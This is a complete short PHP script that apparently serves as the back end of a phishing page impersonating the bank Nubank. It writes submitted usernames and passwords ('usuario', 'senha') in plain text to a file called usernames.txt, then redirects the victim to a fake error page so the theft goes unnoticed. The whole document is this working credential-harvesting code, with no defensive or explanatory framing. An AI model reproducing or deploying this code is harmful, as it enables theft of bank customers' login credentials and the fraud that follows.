<?php

file_put_contents("usernames.txt", "Nubank Username: " . $_POST['usuario'] . " Pass: " . $_POST['senha'] . "\n", FILE_APPEND);
header('Location: erro.html');
exit();
?>